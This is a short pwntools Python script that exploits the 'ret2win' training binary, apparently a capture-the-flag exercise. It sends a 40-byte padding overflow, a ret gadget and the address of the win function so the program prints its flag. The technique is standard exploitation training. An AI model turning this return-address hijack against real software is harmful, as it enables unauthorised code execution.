from pwn import *
context.log_level = 'debug'

binary = "./ret2win"
elf = context.binary = ELF(binary)
rop = ROP(binary)

p = process(binary)
prompt = "> "

p.sendlineafter(prompt, flat(
	"A"*40,
	rop.ret.address,
	elf.symbols.ret2win #0x0000000000400756
))

p.recvuntil("Here's your flag:")
flag = p.recvline()
success(flag)
p.interactive()
